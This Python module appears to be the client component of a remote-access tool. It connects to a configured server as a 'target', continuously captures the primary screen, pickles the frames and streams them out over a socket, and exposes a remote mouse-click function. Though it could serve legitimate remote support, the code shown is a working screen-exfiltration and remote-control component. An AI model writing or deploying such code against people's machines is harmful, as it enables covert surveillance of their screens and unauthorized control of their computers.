from common.util import CONFIG, send

import threading
import pyautogui
import imutils
import struct
import socket
import pickle
import numpy
import json
import mss
import cv2

def start_screenshare(targetID, screenshareID):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((CONFIG["ip"], CONFIG["port"]))

    send(s, {"request_type": "init_target_screenshare", "target_id": targetID, "screenshare_id": screenshareID})
    threading.Thread(target=send_screenshare, args=(s,)).start()

def send_screenshare(s : socket.socket):
    try: callback = s.recv(1024)
    except (ConnectionResetError, ConnectionAbortedError): return
    
    callback = callback.decode("utf-8")
    callback = json.loads(callback)

    if callback["type"] != "screenshare_started":
        print(callback)
        return

    with mss.mss() as screen:
        while True:
            resize = int(screen.monitors[1]["width"] / 2)
            if resize > 800: resize = 800
            
            while True:
                frame = screen.grab(screen.monitors[1])

                frame = cv2.cvtColor(numpy.asarray(frame), cv2.COLOR_RGB2BGR)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                frame = imutils.resize(frame, width=resize)
                pickledFrame = pickle.dumps(frame)
                
                message = struct.pack("Q", len(pickledFrame)) + pickledFrame
                try: s.sendall(message)
                except (ConnectionResetError, ConnectionAbortedError):
                    print("Screenshare Closed")
                    s.close()
                    return

def click(x : int, y : int): pyautogui.click(x, y)
